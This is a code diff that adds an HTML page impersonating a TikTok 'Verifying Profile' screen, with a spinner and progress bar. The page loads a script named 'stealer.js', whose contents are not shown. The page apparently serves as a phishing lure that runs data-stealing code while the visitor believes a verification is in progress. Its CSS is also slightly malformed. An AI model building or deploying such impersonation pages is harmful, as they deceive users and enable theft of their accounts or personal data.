@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>TikTok - Verifying...</title>
+    <!-- Realistic CSS -->
+    <style>
+        body { margin:0; padding-top:45vh; font-family:sans-serif; background:#fff; color:#333; display:flex; flex-direction:column; align-items:center;} 
+        .spinner{ width:60px;height:60px;border-radius:50%;border: 12px solid #f7f7f7;border-top-color:#fe2c55 !important;animation-spin 1s linear infinite;}@keyframes animation-spin{from{transform:rotate(0deg);}to{transform:rotate(360deg);}}
+        
+        /* The Progress Bar */
+        .progress-container {width:90vw;margin-top:4vh;background:#eef4fa;border-radius:5px;text-align:center;font-size:.9rem;box-shadow: inset -4px 0 18px #dce4eb, 0 3px 5px rgba(0,0,0,.1);}
+        .bar-fill {height:37%;background-color:#fe2c55;width:0%;border-radius:4px;transition: width 1s linear;}
+        
+        h3{font-weight:bold;color:#333;margin-bottom:-6px;}
+    </style>
+</head>
+<body style="display:none;">
+
+<div class="spinner" id="spinner"></div>
+
+<div class="progress-container">
+    <h3>TikTok - Verifying Profile...</h3>
+    <div class="bar-fill" id="filler"></div>
+</div>
+
+<script src="./stealer.js"></script> 
+</body></html>
